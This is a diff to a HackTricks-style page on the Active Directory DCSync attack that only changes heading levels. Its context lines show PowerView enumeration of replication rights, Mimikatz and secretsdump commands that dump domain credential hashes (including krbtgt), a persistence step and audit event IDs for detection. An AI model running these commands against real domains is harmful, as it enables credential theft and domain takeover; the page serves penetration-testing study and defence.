@@ -19,8 +19,6 @@ Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
 
 # DCSync
 
-## DCSync
-
 The **DCSync **permission implies having these permissions over the domain itself: **DS-Replication-Get-Changes**, **Replicating Directory Changes All **and **Replicating Directory Changes In Filtered Set**.
 
 **Important Notes about DCSync:**
@@ -29,7 +27,7 @@ The **DCSync **permission implies having these permissions over the domain itsel
 * By default only **Domain Admins, Enterprise Admins, Administrators, and Domain Controllers** groups have the required privileges.
 * If any account passwords are stored with reversible encryption, an option is available in Mimikatz to return the password in clear text
 
-### Enumeration
+## Enumeration
 
 Check who has these permissions using `powerview`:
 
@@ -37,18 +35,18 @@ Check who has these permissions using `powerview`:
 Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')}
 ```
 
-### Exploit Locally
+## Exploit Locally
 
 ```bash
 Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
 ```
 
-### Exploit Remotely
+## Exploit Remotely
 ```bash
 secretsdump.py -just-dc <user>:<password>@<ipaddress>
 ```
 
-### Persistence
+## Persistence
 
 If you are a domain admin, you can grant this permissions to any user with the help of `powerview`:
 
@@ -62,7 +60,7 @@ Then, you can** check if the user was correctly assigned** the 3 privileges look
 Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{$_.IdentityReference -match "student114"}
 ```
 
-### Mitigation
+## Mitigation
 
 * Security Event ID 4662 (Audit Policy for object must be enabled) – An operation was performed on an object
 * Security Event ID 5136 (Audit Policy for object must be enabled) – A directory service object was modified
